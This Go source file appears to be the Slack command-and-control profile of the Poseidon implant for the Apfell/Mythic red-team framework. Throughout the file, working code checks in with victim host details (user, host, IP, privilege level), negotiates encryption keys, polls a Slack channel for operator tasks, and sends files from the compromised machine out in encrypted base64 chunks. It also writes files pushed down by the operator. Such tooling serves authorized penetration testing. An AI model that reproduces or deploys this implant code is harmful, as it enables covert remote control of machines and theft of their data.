// +build slack

package profiles

import (
	"bytes"
	"crypto/rsa"
	"encoding/base64"
	"encoding/json"
	"log"
	"math"
	"os"
	"reflect"
	"strings"
	"time"

	"github.com/nlopes/slack"
	"github.com/xorrior/poseidon/pkg/utils/crypto"
	"github.com/xorrior/poseidon/pkg/utils/functions"
	"github.com/xorrior/poseidon/pkg/utils/structs"
)

var (
	token     = ""
	channelid = ""
)

type C2Slack struct {
	HostHeader     string
	BaseURL        string
	BaseURLs       []string
	Interval       int
	Commands       []string
	ExchangingKeys bool
	ApfellID       string
	UserAgent      string
	ChannelID      string
	ApiToken       string
	Client         *slack.Client
	MessageChannel chan interface{}
	UUID           string
	AesPSK         string
	RsaPrivateKey  *rsa.PrivateKey
}

func newProfile() Profile {
	return &C2Slack{}
}

func (c C2Slack) Header() string {
	return c.HostHeader
}

func (c *C2Slack) SetHeader(newHeader string) {
	c.HostHeader = newHeader
}

func (c C2Slack) URL() string {
	if len(c.BaseURLs) == 0 {
		return c.BaseURL
	} else {
		return c.getRandomBaseURL()
	}
}

func (c *C2Slack) getRandomBaseURL() string {
	return c.BaseURLs[seededRand.Intn(len(c.BaseURLs))]
}

func (c *C2Slack) SetURL(newURL string) {
	c.BaseURL = newURL
}

func (c *C2Slack) SetURLs(newURLs []string) {
	c.BaseURLs = newURLs
}

func (c C2Slack) SleepInterval() int {
	return c.Interval
}

func (c *C2Slack) SetSleepInterval(interval int) {
	c.Interval = interval
}

func (c C2Slack) C2Commands() []string {
	return c.Commands
}

func (c *C2Slack) SetC2Commands(commands []string) {
	c.Commands = commands
}

func (c C2Slack) XKeys() bool {
	return c.ExchangingKeys
}

func (c *C2Slack) SetXKeys(xkeys bool) {
	c.ExchangingKeys = xkeys
}

func (c C2Slack) ApfID() string {
	return c.ApfellID
}

func (c *C2Slack) SetApfellID(newApf string) {
	c.ApfellID = newApf
}

func (c C2Slack) UniqueID() string {
	return c.UUID
}

func (c *C2Slack) SetUniqueID(newID string) {
	c.UUID = newID
}

func (c *C2Slack) SetUserAgent(ua string) {
	c.UserAgent = ua
}

func (c C2Slack) GetUserAgent() string {
	return c.UserAgent
}

func (c C2Slack) AesPreSharedKey() string {
	return c.AesPSK
}

func (c *C2Slack) SetAesPreSharedKey(newKey string) {
	c.AesPSK = newKey
}

func (c C2Slack) RsaKey() *rsa.PrivateKey {
	return c.RsaPrivateKey
}

func (c *C2Slack) SetRsaKey(newKey *rsa.PrivateKey) {
	c.RsaPrivateKey = newKey
}

func (c *C2Slack) SetSlackClient(newclient *slack.Client) {
	c.Client = newclient
}

func (c *C2Slack) GetSlackClient() *slack.Client {
	return c.Client
}

func (c *C2Slack) SetApiToken(token string) {
	c.ApiToken = token
}

func (c *C2Slack) GetApiToken() string {
	return c.ApiToken
}

func (c *C2Slack) SetChannelID(id string) {
	c.ChannelID = id
}

func (c *C2Slack) GetChannelID() string {
	return c.ChannelID
}

func (c C2Slack) ProfileType() string {
	t := reflect.TypeOf(c)
	return t.Name()
}

func (c *C2Slack) GetTasking() interface{} {
	request := structs.TaskRequestMessage{}
	request.Action = "get_tasking"
	request.TaskingSize = 1

	raw, err := json.Marshal(request)

	if err != nil {
		log.Printf("Error unmarshalling: %s", err.Error())
	}

	rawTask := c.sendData("", raw)
	task := structs.TaskRequestMessageResponse{}
	err = json.Unmarshal(rawTask, &task)

	if err != nil {
		log.Printf("Error unmarshalling task data: %s", err.Error())
	}

	return task
}

func (c *C2Slack) PostResponse(task structs.Task, output string) []byte {
	responseMsg := structs.TaskResponseMessage{}
	responseMsg.Action = "post_response"
	responseMsg.Responses = make([]json.RawMessage, 1)
	responseMsg.Responses[0] = []byte(output)

	dataToSend, err := json.Marshal(responseMsg)
	if err != nil {
		log.Printf("Error marshaling data for postRESTResponse: %s", err.Error())
		return make([]byte, 0)
	}

	return c.sendData("", dataToSend)
}

func (c *C2Slack) SendFile(task structs.Task, params string) {
	path := task.Params
	// Get the file size first and then the # of chunks required
	file, err := os.Open(path)

	if err != nil {
		log.Println("Error opening file: ", err.Error())
		return
	}

	fi, err := file.Stat()
	if err != nil {
		log.Println("Error obtaining file stat: ", err.Error())
		return
	}

	size := fi.Size()
	raw := make([]byte, size)
	_, err = file.Read(raw)
	if err != nil {
		log.Println("Error reading file: ", err.Error())
		return
	}

	c.SendFileChunks(task, raw)
}

func (c *C2Slack) SendFileChunks(task structs.Task, fileData []byte) {
	size := len(fileData)

	const fileChunk = 512000 //Normal apfell chunk size
	chunks := uint64(math.Ceil(float64(size) / fileChunk))

	chunkResponse := structs.FileDownloadInitialMessage{}
	chunkResponse.NumChunks = int(chunks)
	chunkResponse.TaskID = task.TaskID
	chunkResponse.FullPath = task.Params

	msg, err := json.Marshal(chunkResponse)
	if err != nil {
		log.Println("Error unmarshaling intial chunk message: ", err.Error())
	}

	resp := c.PostResponse(task, string(msg))
	fileResp := structs.TaskResponseMessageResponse{}

	err = json.Unmarshal(resp, &fileResp)

	if err != nil {
		log.Printf("Error unmarshaling: %s", err.Error())
		return
	}

	var fileDetails map[string]interface{}

	if len(fileResp.Responses) > 0 {
		_ = json.Unmarshal([]byte(fileResp.Responses[0]), &fileDetails)
	}

	r := bytes.NewBuffer(fileData)
	// Sleep here so we don't spam apfell
	time.Sleep(time.Duration(c.Interval) * time.Second)
	for i := uint64(0); i < chunks; i++ {
		partSize := int(math.Min(fileChunk, float64(int64(size)-int64(i*fileChunk))))
		partBuffer := make([]byte, partSize)
		// Create a temporary buffer and read a chunk into that buffer from the file
		read, err := r.Read(partBuffer)
		if err != nil || read == 0 {
			break
		}

		msg := structs.FileDownloadChunkMessage{}
		msg.ChunkNum = int(i) + 1
		msg.FileID = fileDetails["file_id"].(string)
		msg.ChunkData = base64.StdEncoding.EncodeToString(partBuffer)
		msg.TaskID = task.TaskID

		encmsg, err := json.Marshal(msg)
		if err != nil {
			log.Println("Error Marshaling chunk message: ", err.Error())
			break
		}

		resp := c.PostResponse(task, string(encmsg))
		postResp := structs.TaskResponseMessageResponse{}

		err = json.Unmarshal(resp, &postResp)
		if err != nil {
			log.Println("Error unmarshaling task response message response: ", err.Error())
			break
		}

		var decResp map[string]interface{}
		if len(postResp.Responses) > 0 {
			_ = json.Unmarshal(postResp.Responses[0], &decResp)
		}

		if !strings.Contains(decResp["status"].(string), "success") {
			// If the post was not successful, wait and try to send it one more time
			time.Sleep(time.Duration(c.Interval) * time.Second)
			resp = c.PostResponse(task, string(encmsg))
		}

		time.Sleep(time.Duration(c.Interval) * time.Second)
	}

	final := structs.Response{}
	final.Completed = true
	final.TaskID = task.TaskID
	final.UserOutput = "file downloaded"
	finalEnc, _ := json.Marshal(final)
	c.PostResponse(task, string(finalEnc))
}

func (c *C2Slack) GetFile(fileDetails structs.FileUploadParams) bool {
	success := false

	fileUploadMsg := structs.FileUploadChunkMessage{} //Create the file upload chunk message
	fileUploadMsg.Action = "upload"
	fileUploadMsg.FileID = fileDetails.FileID
	fileUploadMsg.ChunkSize = 1024000
	fileUploadMsg.ChunkNum = 1
	fileUploadMsg.FullPath = fileDetails.RemotePath

	msg, _ := json.Marshal(fileUploadMsg)
	rawData := c.sendData("", msg)

	fileUploadMsgResponse := structs.FileUploadChunkMessageResponse{} // Unmarshal the file upload response from apfell
	_ = json.Unmarshal(rawData, &fileUploadMsgResponse)

	f, err := os.Create(fileDetails.RemotePath)
	if err != nil {
		log.Printf("Error creating file: %s", err.Error())
		return success
	}

	decoded, _ := base64.StdEncoding.DecodeString(fileUploadMsgResponse.ChunkData)

	_, err = f.Write(decoded)

	if err != nil {
		log.Printf("Error writing to file: %s", err.Error())
		return success
	}

	success = true
	offset := int64(len(decoded))

	if fileUploadMsgResponse.TotalChunks > 1 {
		for index := 2; index <= fileUploadMsgResponse.TotalChunks; index++ {
			fileUploadMsg = structs.FileUploadChunkMessage{}
			fileUploadMsg.Action = "upload"
			fileUploadMsg.ChunkNum = index
			fileUploadMsg.ChunkSize = 1024000
			fileUploadMsg.FileID = fileDetails.FileID
			fileUploadMsg.FullPath = fileDetails.RemotePath

			msg, _ := json.Marshal(fileUploadMsg)
			rawData := c.sendData("", msg)

			fileUploadMsgResponse = structs.FileUploadChunkMessageResponse{} // Unmarshal the file upload response from apfell
			_ = json.Unmarshal(rawData, &fileUploadMsgResponse)

			decoded, _ := base64.StdEncoding.DecodeString(fileUploadMsgResponse.ChunkData)

			_, err := f.WriteAt(decoded, offset)

			if err != nil {
				log.Printf("Error writing to file: %s", err.Error())
				success = false
				break
			}

			offset = offset + int64(len(decoded))
		}
	}
	return success
}

func (c *C2Slack) CheckIn(ip string, pid int, user string, host string) interface{} {

	c.SetApiToken(token)
	c.SetChannelID(channelid)

	c.SetSlackClient(slack.New(c.GetApiToken()))

	var resp []byte
	c.ApfellID = c.UUID
	checkin := structs.CheckInMessage{}
	checkin.Action = "checkin"
	checkin.User = user
	checkin.Host = host
	checkin.IP = ip
	checkin.Pid = pid
	checkin.UUID = c.UUID

	if functions.IsElevated() {
		checkin.IntegrityLevel = 3
	} else {
		checkin.IntegrityLevel = 2
	}

	checkinMsg, _ := json.Marshal(checkin)

	if c.ExchangingKeys {
		_ = c.NegotiateKey()
	}

	resp = c.sendData("", checkinMsg)
	log.Printf("Raw Checkin response: %s\n", string(resp))
	response := structs.CheckInMessageResponse{}
	err := json.Unmarshal(resp, &response)
	if err != nil {
		log.Printf("Error unmarshaling response: %s", err.Error())
		return structs.CheckInMessageResponse{Status: "failed"}
	}

	if len(response.ID) > 0 {
		c.ApfellID = response.ID
	}

	return response
}

func (c *C2Slack) NegotiateKey() string {
	sessionID := GenerateSessionID()
	pub, priv := crypto.GenerateRSAKeyPair()
	c.RsaPrivateKey = priv
	initMessage := structs.EkeKeyExchangeMessage{}
	initMessage.Action = "staging_rsa"
	initMessage.SessionID = sessionID
	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)

	// Encode and encrypt the json message
	raw, err := json.Marshal(initMessage)

	if err != nil {
		log.Printf("Error marshaling data: %s", err.Error())
		return ""
	}

	resp := c.sendData("", raw)

	decryptedResponse := crypto.RsaDecryptCipherBytes(resp, c.RsaKey())
	log.Printf("Apfell EKE Reponse: %s\n", string(decryptedResponse))
	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}

	err = json.Unmarshal(decryptedResponse, &sessionKeyResp)
	if err != nil {
		log.Printf("Error unmarshaling RsaResponse %s", err.Error())
		return ""
	}

	c.AesPSK = sessionKeyResp.SessionKey
	c.ExchangingKeys = false

	if len(sessionKeyResp.UUID) > 0 {
		c.ApfellID = sessionKeyResp.UUID
	}

	return sessionID
}

func (c *C2Slack) sendData(tag string, sendData []byte) []byte {
	var timestamp string
	m := structs.Message{}
	m.Client = true

	if len(c.AesPSK) > 0 && !strings.Contains(c.AesPSK, "AESPSK") {
		sendData = EncryptMessage(sendData, c.AesPreSharedKey())
	}

	sendData = append([]byte(c.ApfellID), sendData...)
	sendData = []byte(base64.StdEncoding.EncodeToString(sendData))

	m.Tag = tag
	m.Data = string(sendData)
	rawM, err := json.Marshal(m)

	if err != nil {
		log.Printf("Error marshaling message: %s", err.Error())
		return make([]byte, 0)
	}

	if len(rawM) < 4000 {
		// Messages less than
		log.Println("Sending a normal message")
		_, timestamp, _, err = c.Client.SendMessage(c.GetChannelID(), slack.MsgOptionText(string(rawM), true))

		if err != nil {
			log.Printf("Error sending message: %s", err.Error())
			return make([]byte, 0)
		}

	} else if len(rawM) > 4000 && len(rawM) < 8000 {
		log.Println("Sending an attachment")
		attachment := slack.Attachment{
			Color:         "",
			Fallback:      "",
			CallbackID:    "",
			ID:            0,
			AuthorID:      "",
			AuthorName:    "",
			AuthorSubname: "",
			AuthorLink:    "",
			AuthorIcon:    "",
			Title:         "",
			TitleLink:     "",
			Pretext:       "",
			Text:          string(rawM),
			ImageURL:      "",
			ThumbURL:      "",
			Fields:        nil,
			Actions:       nil,
			MarkdownIn:    nil,
			Footer:        "",
			FooterIcon:    "",
			Ts:            "",
		}

		_, timestamp, _, err = c.Client.SendMessage(c.GetChannelID(), slack.MsgOptionAttachments(attachment), slack.MsgOptionText("", true))
		if err != nil {
			log.Printf("Error sending message: %s", err.Error())
			return make([]byte, 0)
		}
	} else {
		log.Println("Uploading a file")
		fname := GenerateSessionID()

		params := slack.FileUploadParameters{
			File:           "newmessage.json",
			Content:        string(rawM),
			Reader:         nil,
			Filetype:       "",
			Filename:       fname,
			Title:          "",
			InitialComment: "",
			Channels:       []string{c.GetChannelID()},
		}

		f, err := c.Client.UploadFile(params)
		if err != nil {
			log.Printf("Error sending message: %s", err.Error())
			return make([]byte, 0)
		}

		timestamp = f.Shares.Public[c.GetChannelID()][0].Ts

	}

	respMsg := structs.Message{}

	for {

		params := &slack.GetConversationRepliesParameters{
			ChannelID: c.GetChannelID(),
			Timestamp: timestamp,
			Inclusive: false,
			Oldest:    timestamp,
		}

		msgs, _, _, err := c.Client.GetConversationReplies(params)

		if len(msgs) > 1 {
			reply := msgs[1]
			log.Printf("Received %d replies\n", len(msgs))

			if len(reply.Text) != 0 && len(reply.Attachments) == 0 && len(reply.Files) == 0 {
				log.Printf("Plain Message text: %s", reply.Text)
				err = json.Unmarshal([]byte(reply.Text), &respMsg)
				if err != nil {
					log.Println("Error unmarshaling text response ", err.Error())
				}

				break
			} else if len(reply.Attachments) > 0 {
				content := reply.Attachments[0].Text
				log.Printf("Message from attachment: %s", content)
				err = json.Unmarshal([]byte(content), &respMsg)
				if err != nil {
					log.Println("Error unmarshaling attachment response ", err.Error())
				}
				break
			} else if len(reply.Files) > 0 {
				var fileContents bytes.Buffer

				err := c.Client.GetFile(reply.Files[0].URLPrivateDownload, &fileContents)
				if err != nil {
					log.Println("error getting file ", err.Error())
				}
				log.Printf("Message from file: %s", string(fileContents.Bytes()))
				err = json.Unmarshal(fileContents.Bytes(), &respMsg)
				if err != nil {
					log.Println("Error unmarshaling file response ", err.Error())
				}

				break
			}
		}

		time.Sleep(time.Duration(c.SleepInterval()) * time.Second)
	}

	raw, err := base64.StdEncoding.DecodeString(respMsg.Data)
	if err != nil {
		log.Println("Error decoding base64 data: ", err.Error())
		return make([]byte, 0)
	}

	enc_raw := raw[36:] // Remove the Payload UUID
	log.Printf("AESPSK length %d", len(c.AesPSK))
	log.Println("Exchanging keys ", c.ExchangingKeys)
	if len(c.AesPSK) > 0 && c.ExchangingKeys != true {
		dec := DecryptMessage(enc_raw, c.AesPreSharedKey())
		log.Printf("Decrypted Response from apfell: %s", string(dec))
		return dec
	}

	log.Println("Skipped decryption")
	return enc_raw
}
